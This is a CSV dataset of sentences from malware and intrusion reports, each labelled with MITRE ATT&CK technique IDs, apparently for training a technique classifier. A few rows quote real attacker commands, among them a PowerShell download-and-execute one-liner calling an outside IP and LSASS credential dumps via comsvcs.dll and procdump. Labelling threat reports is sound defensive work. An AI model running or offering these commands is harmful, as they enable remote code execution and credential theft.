text,label
We have written python script to defeat GuLoader shellcode control flow obfuscation and saving time and efforts of malware analyst.,T1027
"Arrival vectors We previously summarized the arrival vectors used by Earth Preta by categorizing them into three types (DLL sideloading, shortcut links, and fake file extensions).",T1574.002
Infection flow for the new arrival vector File name Detection name Description Letter Head.docx Decoy document with Google Drive link List of terrorist personnel IN border.rar (all entries below are part of this archive) List of terrorist personnel at the border.exe First-stage legitimate executable for DLL sideloading libcef.dll Trojan.Win32.TONEINS First-stage malware ~$Evidence information.docx Second-stage legitimate executable for DLL sideloading ~$List of terrorist personnel at the border.docx Backdoor.Win32.TONESHELL Second-stage malware Internal Letter.docx Decoy document Letter Head.docx Decoy document Table 1.,T1574.002
"The infection flow for these is similar to the arrival vector type C in our previous report, with the only difference being that the fake .docx files have XOR-encrypted content to prevent detection.",T1027
"The TONEINS malware, libcef.dll, will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path.",T1140
A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure.,T1140
"The decryption function of TONEINS The succeeding behaviors of the infection flow are generally the same as those in our previous analysis, where we provide more details.",T1140
"The data in the HTTP body is the same as the past variant, which has the same magic bytes 17 03 03 and the encrypted victim information.",T1071.001
"C&C traffic of the PUBLOAD HTTP variant Once the payload is received, it will check if the first three magic bytes are 17 03 03 and if the following two bytes are the size of payload.",T1071.001
"It will then decrypt the encrypted payload with the predefined RC4 key 78 5A 12 4D 75 14 14 11 6C 02 71 15 5A 73 05 08 70 14 65 3B 64 42 22 23 20 00 00 00 00 00 00 00, which is the same as the one used in the PUBLOAD loader.",T1140
"The first payload retrieved from the PUBLOAD HTTP variant After decryption, it then checks if the first byte of the decrypted payload is 0x06.","T1140, T1071.001"
The decrypted payload contains another payload that is XOR-encrypted with the bytes 23 BE 84 E1 6C D6 AE 52 90.,"T1027, T1140"
"The second payload retrieved from the PUBLOAD HTTP variant After this is decrypted, there is yet another final backdoor payload that supports data upload and command execution.","T1105, T1059.003, T1140, T1071.001"
The final payload of the PUBLOAD HTTP variant Command Internal string 0x03 - 0x01 - 0x1B UploadBegin error : %d! 0x1D UploadData error : %d! 0x1A - 0x1E CmdStart error : %d! 0x1F CmdWrite error :,T1071.001
"Command codes in the PUBLOAD HTTP variant In addition, we found some interesting debug strings and event names among the PUBLOAD samples.",T1071.001
"Discovery Once the threat actors obtain access to the victim’s environment, they can start inspecting the environment via the following commands: net user net user <username> net user <username>",T1033
"/DOMAIN Privilege escalation In this campaign, we discovered several tools used for UAC bypass in Windows 10.",T1548.002
Win 32.ABPASS HackTool.Win32.ABPASS is a tool used to bypass UAC in Windows 10.,T1548.002
"￼ This tool accepts an argument, and the following data is written into registry: Registry Key Name Value HKEY_USERS\<SID>-1001_Classes\aaabbb32\shell\open\command (Default)",T1112
Registry keys changed by ABPASS,T1112
It also sets up a new ProgID aaabbb32 and its shell open command.,T1059.003
Win 32.CCPASS HackTool.,T1548.002
Win32.CCPASS is another tool that is also used for Windows 10 UAC bypass and similarly reuses codes from the function ucmMsStoreProtocolMethod in the project UACME.,T1548.002
The hack tool CCPASS works as follows: It disables the application association toasts for the protocol ms-windows-store.,T1112
It creates a new Shell in the registry.,"T1106, T1112"
It invokes the undocumented API UserAssocSet to update the file association.,T1106
This service has the highest privileges that can be abused for Windows 10 UAC bypass.,T1548.002
"Lateral movement In this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed by Mandiant and Sophos) being used to install themselves to removable disks and create a reverse shell.",T1059.003
"HIUPAN and ACNSHELL infection flow The USB Driver.exe program first sideloads u2ec.dll, which then loads the payload file usb.ini.",T1574.002
"If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence.",T1112
"Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.",T1574.002
It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.,T1059.003
"For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91. Figure 19.",T1105
The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.]181 for future use. Figure 20.,T1105
"PowerShell downloading malware In certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware.",T1105
This is a simple backdoor that is capable of executing commands and clearing event logs.,T1059.003
"Meanwhile, loader.ja is used under two processes: One is under googleupdate.exe, which is used for the first sideloading.",T1574.002
"The second is under winver.exe, which is injected to conduct backdoor behaviors.",T1055
"Furthermore, COOLCLIENT applies obfuscation techniques that we discuss in later sections. Figure 23.",T1027
"There are three conditions different ways to decide the method of installation for COOLCLIENT, detailed here: It installs itself by creating an InstallSvc service called InstallSvc which will trigger “googleupdate.exe work”..","T1547.001, T1543.003"
It sets up a run key for via the command C:\ProgramData\GoogleUpdate\googleupdate.exe work for persistence. work.,T1547.001
"The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next-stage payload (COOLCLIENT), which contains malicious behaviors.","T1055, T1140"
"If avp.exe doesn’t exist, UAC bypass will be executed via the CMSTPLUA COM interface.",T1548.002
"If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.",T1548.002
UAC Bypass via the CMSTPLUA COM interface Figure 26.,T1548.002
"UAC Bypass via the AppInfo RPC service Based on the class name used in COOLCLIENT, we learned thaAccording to our analysis, it reads the encrypted configuration filecan expand the C&C server via time.sig., an encrypted configuration.","T1027, T1548.002"
It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).,T1095
"Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.","T1106, T1056.001, T1070.004"
"However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings dbg.exe or olly. Figure 27.",T1057
"There are two waysto determine the method of installation for TROCLIENT, detailed here: It installs itself by creating aservice called InstallSvc which will trigger “C:\programdata\netsky\netsky.exe online”.","T1547.001, T1569.002, T1543.003"
It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence.,T1547.001
"online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe. passuac:",T1055
"If it does not, UAC bypass is executed via the CMSTPLUA COM interface.",T1548.002
"If avp.exe exists, UAC bypass is executed via token manipulation.",T1548.002
"The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.","T1056.001, T1070.004"
Argument/Behaviors COOLCLIENT TROCLIENT install Creates a service named InstallSvc ✓ ✓ Executes itself with passuac ✓ ✓ Sets Run Key with “work/online” ✓ ✓ passuac AppInfo RPC ✓ CMSTPLUA COM ✓ ✓ Token manipulation ✓ work/online Send portmap ✓ Connect to C&C ✓ ✓ File operations ✓ ✓ Keylogging ✓ ✓ Table 3.,"T1547.001, T1543.003, T1056.001"
"It seems that the threat actors are continuously updating this tool to provide more flexibility and lower the possibility of detection, including adding more command-line arguments and obfuscation mechanisms.","T1027, T1059.003"
"Starting from the offset 0x100, the logging strings are encrypted with a single byte in XOR operations as shown Figure 33.",T1027
"The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.",T1573.001
"Self-defined format description in the file with the .z extension generated by NUPAKAGE It’s also worth mentioning that in the more recent versions of NUPAKAGE, an increasing number of obfuscations are being adopted to thwart static analysis.",T1027
Win32.ZPAKAGE ZPAKAGE is another example of custom malware used for packing files; it also works similarly to NUPAKAGE.,T1027
"An example of a ZPAKAGE password ZPAKAGE also supports command-line arguments, but it possesses less functions than NUPAKAGE.",T1059.003
"Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string, qwerasdf.",T1573.001
Screenshot of the Google Drive link The new arrival vector flow is similar to the one we introduced in the arrival vector section: Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email.,"T1566.001, T1204.002"
Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled.,T1021.001
"At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.","T1574.002, T1053.005"
"Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.",T1574.002
"The 1226 repository Upon unarchiving the compressed file, we found two files with the fake extension “.doc” containing one-byte XOR encrypted sections.",T1027
"Exe, found in the Documents.rar archive, is a novel malware that communicates over the MQTT protocol.",T1071.001
"This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices.",T1071.001
Basic Terminology for Reverse Engineers to Know An executable file can conceal its true code through either encryption or compression.,T1027
"When the file is executed, some initial code usually called a stub, decrypts or decompresses the real code so it can be executed.",T1140
"While packers can be used for legitimate purposes, malware developers utilize packers to make the malicious payload smaller and avoid detection based on static malware analysis techniques.",T1027
Examples: UPX is an open-source packing algorithm.,T1027
MPRESS is a free packer.,T1027
Andromeda is a custom packer that makes reverse-engineering more difficult.,T1027
"On the other hand, there are loaders that serve as the first stage of the attack, the payload of the malware can be part of the loader’s file or it can be downloaded from a remote location (by the loader, also known as a Downloader).","T1027, T1105"
"The packers compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.",T1027
"The entry point of the original file is relocated, and so is the Import Address Table (IAT).",T1027
The stub is a small part of code that implements the decompression (and decryption) of the originally packed file.,T1140
"Packers may change the final payload’s section names, as seen in the screenshot below.",T1027
Packed samples usually have very few imports as they don’t rely on external libraries like other programs.,T1027
"When a file has a low number of imports, it strongly indicates that it contains another component that is dropped/loaded.",T1027
"API Calls Essentially, all packers need to perform the following operations: allocate memory, change permissions, read the encrypted/packed chunk of code, decrypt it, load it to the allocated memory space and execute it.",T1027
"To make all of these actions, the program must use system calls because these actions require interaction with the kernel.","T1027, T1106"
The relevant system calls are VirtualAlloc used for allocating memory in the current process.,"T1027, T1106"
"Knowing the size can help identify when a program allocates big memory space, possibly for the unpacked payload.","T1027, T1106"
VirtualProtect changes the permissions of the given virtual address.,"T1027, T1106"
When malware wants to grant write or execute permissions flNewProtect argument will be set to PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20).,"T1027, T1106"
RtlDecompressBuffer decompresses the provided buffer.,"T1027, T1106"
CreateProcessInternalW creates a new process.,"T1027, T1106"
"In the context of malware execution, it can create a new threat with the malicious unpacked payload.",T1027
"However, malware authors usually try to hide these system calls.",T1027
"For instance, we will not see them in the imported function list, and they not even be part of the strings in the sample.",T1027
"In this case, the function and the corresponding library are dynamically loaded at runtime – also known as explicit linking.",T1027
"Our follow-up analysis discovered that firmware in Gigabyte systems is dropping and executing a Windows native executable during the system startup process, and this executable then downloads and executes additional payloads insecurely.",T1105
Key Findings There are two important aspects of our findings: Eclypsium automated heuristics detected firmware on Gigabyte systems that drops an executable Windows binary that is executed during the Windows startup process.,T1105
This executable binary insecurely downloads and executes additional payloads from the Internet.,T1105
Firmware dropping OS executable An initial analysis of the affected UEFI firmware identified the following file: 8ccbee6f7858ac6b92ce23594c9e2563ebcef59414b5ac13ebebde0c715971b2.bin,T1027
This is a Windows Native Binary executable embedded inside of UEFI firmware binary in a UEFI firmware volume with the following GUID: AEB1671D-019C-4B3B-BA-00-35-A2-E6-28-04-36.,T1027
"This Windows executable is embedded into UEFI firmware and written to disk by firmware as part of the system boot process, a technique commonly used by UEFI implants and backdoors.",T1027
"During the Driver Execution Environment (DXE) phase of the UEFI firmware boot process, the “WpbtDxe.efi” firmware module uses the above GUID to load the embedded Windows executable file into memory, installing it into a WPBT ACPI table which will later be loaded and executed by the Windows Session Manager Subsystem (smss.exe) upon Windows startup.",T1027
"Although this setting appears to be disabled by default, it was enabled on the system we examined.",T1106
This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location:,"T1027, T1106"
%SystemRoot%\system32\GigabyteUpdateService.exe It then sets registry entries to run this executable as a Windows Service.,"T1569.002, T1112"
Stage 2: Downloading and running further executables,T1105
"It downloads and runs an executable payload from one of the following locations, depending on how it’s been configured: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Plain HTTP (the first bullet above) should never be used for updating privileged code as it is easily compromised via Machine-in-the-middle (MITM) attacks.",T1105
"However, we noticed that even when using the HTTPS-enabled options, remote server certificate validation is not implemented correctly.",T1071.001
"Often, the above implants made their native Windows executables look like legitimate update tools.",T1036.005
"In the case of MosaicRegressor, the Windows payload was named “IntelUpdater.exe” MITM attacks on firmware and software update features – Additionally, the insecure nature of the update process opens the door to MITM techniques via a compromised router, compromised device on the same network segment, DNS poisoning, or other network manipulation.",T1036.005
"Background NetSupport RAT is based on NetSupport Manager, a legitimate tool which is frequently used by bad actors for malicious purposes in ways similar to TeamViewer.",T1219
"NetSupport Manager, used maliciously or otherwise, provides full and complete control over the target device.",T1219
"In addition, the software allows at least the following: Real-time screen monitoring, optimized for monitoring multiple devices Taking control or redirect user screens Capturing screenshots, audio, video Malicious versions are constantly being sold or rented out via underground crime marketplaces.",T1113
"NetSupport Manager RAT offered for rental As NetSupport Manager is a legitimate tool that has a long history of development, it is highly attractive to attackers as it can be relied on to work ‘out of the box’.",T1219
"Sample 4233ff7941da62b86fc2c2d92be0572c9ab534c8 has been observed in multiple ISO files masquerading as legitimate software, including: CodeTwo Exchange Manager PCFresh 2022 SDK Tools Google Chrome Google Crash Handler Steelray Project Setup BrowserRenew.iso CLFsecurity.",T1036.005
ISO Cloudflare_security_setup.iso The RAT installation is disguised to look similar to a Google Chrome installation.,T1036.005
NetSupport RAT installer disguised as Google Chrome setup.,"T1027, T1036.005"
The sample is obfuscated via the Babadeda crypter.,T1027
"When executed, a base64 encoded string is used to specify various parameters including sessionID and other critical values to the NetSupport connection.",T1027
"Base64 encoded RAT execution command The command decodes to look similar to the following: NetSupport RAT decoded command Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.","T1027, T1547.001, T1140"
"In addition, the sample generates a scheduled task with multiple triggers.",T1053.005
NetSupport RAT Persistence via Scheduled Task Install directory of NetSupport RAT The RAT performs a number of discovery operations to understand its host environment.,T1053.005
Network adapter details are pulled via GetAdaptersAddresses.,T1016
Additional data is gleaned via WMI queries such as: SELECT *,"T1047, T1082"
FROM Win32_ComputerSystem SELECT *,T1082
"The malware deploys some anti-analysis measures such as attempting to detect the presence of a debugger via IsDebuggerPresent, and all running processes are enumerated and logged via EnumProcesses (32-bit processes).",T1057
NetSupport RAT has the ability to drop and execute additional components.,T1105
These files are all self-deleted after launch or full installation of the attacker configuration.,T1070.004
"NetSupport RAT, once installed, is very robust and powerful, and threat actors are able to masquerade the dropper or installer in any way they see fit.",T1036.005
"In addition, threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software.",T1204.002
"RapperBot: “intelligent brute forcing” RapperBot, based on Mirai (but with a different C2 command protocol), is a worm infecting IoT devices with the ultimate goal to launch DDoS attacks against non-HTTP targets.",T1110
"What sets RapperBot apart from other worms is its “intelligent” way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.",T1110
This method speeds up the brute forcing process significantly because it doesn’t have to go over a huge list of credentials.,T1110
RapperBot then determines the processor architecture and infects the device.,T1082
"The downloading of the actual malware is done via a variety of possible commands (for example, wget, curl, tftp and ftpget).",T1570
"If for some reason these methods don’t work, then a malware downloader is uploaded to the device via the shell “echo” commands.","T1105, T1059.003"
Is able to do a “stealthy” infection.,T1082
"Is able to steal/gather information on CPU type, screen resolution, supported wallets, and so on.",T1082
"In case all checks are passed, the malware: Reconfigures Windows Defender to exclude the user profile path and the entire system drive from scanning.",T1562.001
Creates empty files and subdirectories in %ProgramData%\HostData to make the directory look benign.,T1105
Downloads the miner and watcher.,T1105
Gootkit is a very capable banking Trojan that has been around since 2014 and possesses a number of functionalities such as keystroke or video recording designed to steal financially-related information.,T1056.001
"In this latest campaign, threat actors are relying on compromised websites to socially engineer users by using a decoy forum template instructing them to download a malicious file.",T1204.002
The infection process starts once the victim executes a malicious script inside the zip archive they just downloaded.,"T1027, T1204.002"
"The following diagram shows a high level overview: Figure 5: Infection flow Stage 1 – The first JavaScript The first JavaScript is the module that has to be manually executed by the victim, and it has been obfuscated in order to hide its real intentions.","T1027, T1204.002"
The obfuscation consists of three layers where one decodes content for the next.,T1140
The first stage (a version with cleaned formatting available here) decodes the next element: Figure 6: First stage script The decoded output is a comma-separated array of JavaScript blocks: Figure 7: Decoded comma-separated array of scripts There are four elements in the array that are referenced by their indexes.,T1140
Block 1 is responsible for reading/writing registry keys under “HKEY_CURRENT_USER\SOFTWARE\<script-specific name>”.,T1112
It also deobfuscates and runs another block of code: Figure 8: Third JavaScript layer This fragment of code is responsible for connecting to the C2.,T1140
"The differentiation between the variants starts in the next part, which is another JavaScript fetched from the C2 server.",T1105
"Figure 9: GET request with C2 server After conversion to ASCII, the next JavaScript is revealed, and the code is executed.",T1071.001
"This JavaScript comes with an embedded PE payload which may be either a loader for Gootkit, or for the REvil ransomware.",T1027
There are also some differences in the algorithm used to deobfuscate it.,T1140
"Example for the Gootkit variant (commented, full) Figure 10: The downloaded JavaScript The downloaded code chunk is responsible for installing the persistent elements.",T1105
"It also runs a Powershell script that reads the storage, decodes it and runs it further.",T1140
"In one of them, the PE is stored as a Base64 encoded string, and in the other as a hexadecimal string, obfuscated by having certain numbers substituted by a pattern.",T1027
"The payload is usually stored as a list of registry keys, yet we also observed a variant in which similar content was written into a TXT file.",T1027
Example of the payload stored in a file: Figure 11: Payload as a file on disk The content of the file is an obfuscated Powershell script that runs another Base64 obfuscated layer that finally decodes the .NET payload.,T1027
"Example of the Powershell script that runs to deobfuscate the file: ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy",T1140
The example below shows the variant in which a PE file was encoded as an obfuscated hexadecimal string.,T1027
"Execution of the second stage JavaScript leads to the payload being written to the registry, as a list of keys.",T1112
"Figure 12: Fragment of the payload stored in the registry, encoded as a hexadecimal string obfuscated with a pattern After writing the keys, the JavaScript deploys a PowerShell command that is responsible for decoding and running the stored content.",T1140
Figure 13: The JS component deploys PowerShell with a Base64 encoded script Decoded content of the script: Figure 14: Decoded content It reads the content from the registry keys and deobfuscates it by substituting patterns.,"T1027, T1140"
"In the given example, the pattern “!@#” in the hexadecimal string was substituted by “1000”, then the PE was decoded and loaded with the help of .NET",T1140
The Setup function called by the PowerShell script is responsible for decoding and running the next PE: Figure 15: Hardcoded string (PE) Figure 16:,T1140
Deploying the payload The loader runs to the next stage with the help of Process Hollowing – one of the classic methods of PE injection.,T1055
"Figure 17: REvil ransom note Example 2 – Loading Gootkit In an other common variant, the payload is saved as Base64.",T1027
"Convert]::FromBase64String(""[content]"")); Invoke-Expression $Command;Start-Sleep -s 22222; Figure 18: Registry key storing payload After decoding the base64-encoded content, we get another PowerShell script: Figure 19:",T1140
More PowerShell It comes with yet another Base64-encoded piece that is further decompressed and loaded with the help of Reflection Assembly.,T1140
"This function loads another PE, that is embedded inside as a base64 encoded buffer: Figure 20: Another buffer Figure 21: Deploying the payload This time the loader uses another method of PE injection, manual loading into the parent process.","T1027, T1055"
"In its resources we can find another PE (327916a876fa7541f8a1aad3c2270c2aec913bc8898273d545dc37a85ef7307f ), obfuscated by XOR with a single byte.",T1027
"Separate clusters of IcedID activity (Proofpoint) New IcedID campaigns Starting in November 2022, the “Lite” variant of the IcedID loader was delivered as a second-stage payload on systems infected by the newly-returned Emotet malware.",T1566.001
"The “Forked” version of the malware loader first appeared in February 2023, distributed directly through thousands of personalized invoice-themed phishing emails.",T1566.001
"These messages used Microsoft OneNote attachments (.one) to execute a malicious HTA file that, in turn, runs a PowerShell command which fetches IcedID from a remote resource.","T1566.001, T1105"
"At the same time, the victim is served a decoy PDF.",T1566.001
Malicious OneNote attachment used in recent campaign (Proofpoint),T1566.001
"The new variants The “Forked” IcedID loader is quite similar to the “Standard” version in terms of its role, sending basic host info to the C2 and then fetching the IcedID bot.",T1041
"However, “Forked” uses a different file type (COM Server) and features additional domain and string-decryption code, making the payload 12KB larger than the “Standard” version.",T1140
"The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",T1204.002
"The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",T1204.002
"When the user double clicks or opens the lnk file, they inadvertently starts a hidden file in the directory, a DLL (namr.dll) containing the Bumblebee malware loader.","T1564.001, T1204.002"
"At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",T1105
"This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",T1055
"From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.","T1057, T1055, T1059.003"
"Four hours after initial access, the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.","T1021.001, T1078"
"The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.",T1219
"Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",T1021.001
"Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",T1570
"They then used remote services to execute Procdump, which was used to dump lsass.",T1003.001
"After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",T1219
The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.,T1105
"After injecting into various processes on the host, the threat actors executed the PowerShell script Invoke-Kerberoast.",T1055
"Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",T1003.001
"AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",T1059.003
"These batch scripts’ purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.",T1059.003
"Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",T1569.002
Timeline Analysis and reporting completed by @0xtornado and @MetallicHack Initial Access,T1566.001
"The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",T1566.001
"The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:","T1218.011, T1059.003, T1204.002"
"C:\Windows\System32\cmd.exe /c start rundll32 namr.dll,IternalJob Running Eric Zimmerman’s tool LECmd revealed additional details related to the threat actors.","T1059.003, T1218.011"
"The metadata included TA machine’s hostname, MAC address, and the LNK document creation date: Execution Execution of multiple payloads The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.","T1105, T1016, T1082"
"The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into: Sysmon File Created event showing wab.exe created by rundll32.exe Sysmon Event Code 1 showing wab.exe executed by WMI Execution of Cobalt Strike The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory: C:\Windows\system32\cmd.exe /C","T1047, T1218.011, T1105, T1027, T1059.003, T1055"
powershell.exe -nop,T1059.003
"-w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))"" Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.","T1059.003, T1071.001"
"This payload can be deobfuscated using the following CyberChef recipe: Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') From_Base64('A-Za-z0-9+/=',true) Gunzip() Label('Decode_Shellcode') Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') Conditional_Jump('',false,'',10) From_Base64('A-Za-z0-9+/=',true) XOR({'option':'Decimal','string':'35'},'Standard',false) Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike: One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool: The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).",T1140
Persistence AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.,"T1543.003, T1219"
Privilege Escalation GetSystem Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).,T1059.003
"cbdhsvc , a process where Cobalt Strike was injected into: C:\Windows\system32\cmd.exe /C","T1055, T1059.003"
getsystem,T1059.003
"A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender’s Guide blog post. Valid Accounts Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain.",T1078
"A service account, with Domain Administration permissions, was used to create a remote service on a Domain Controller to move laterally.",T1078
Defense Evasion Process Injection The process injection technique was used multiple times to inject into different processes.,T1055
Almost every post-exploitation job was launched from an injected process.,T1055
"Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe: Threat actors also created a remote thread in svchost.exe: Multiple processes were then spawned by : C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p",T1055
A yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts as well.,T1055
WpnUserService 20400 rundll32.exe C:\Windows\System32\rundll32.exe Indicator Removal on Host: File Deletion,T1027
"We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",T1027
The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process: Credential Access LSASS Dump MiniDump Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p,"T1027, T1003.001"
-s cbdhsvc beacon: cmd.exe /C,"T1059.003, T1218.011"
"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full ProcDump Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:","T1027, T1003.001, T1218.011"
"The ProcDump utility was executed on those workstations using the following command line: C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp Kerberoasting Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected: Here is an extract of PowerShell EventID","T1003.001, T1055"
"Around 3 hours later, the service account logged into one of the Domain Controllers from the beachhead.",T1078
We assess with high confidence that the service account password was weak and cracked offline by threat actors.,T1110
"Discovery Reconnaissance System Information & Software Discovery The following commands were launched by wab.exe beacon: whoami ipconfig /all tasklist systeminfo wmic product get name,version wmic /node:<REDACTED> process list brief net view \\<REDACTED>\Files$ /all dir \\<REDACTED>\C$\ Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely: tasklist /v /s","T1047, T1057, T1082, T1033, T1016"
"Opsec mistake Threat actors failed on a part of their tasks, by executing the command in the wrong console: C:\Windows\System32\rundll32.exe ➝ C :\Windows\system32\cmd.exe /C","T1033, T1059.003, T1218.011"
shell whoami /all,"T1033, T1059.003"
Network scanning Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files: s.bat script: @echo off for /f,T1059.003
%%j >> serv.log w.bat script: @echo off for /f,T1059.003
"| Tee-Object ShareFinder.txt Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\ProgramData\. Seatbelt The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.",T1218.011
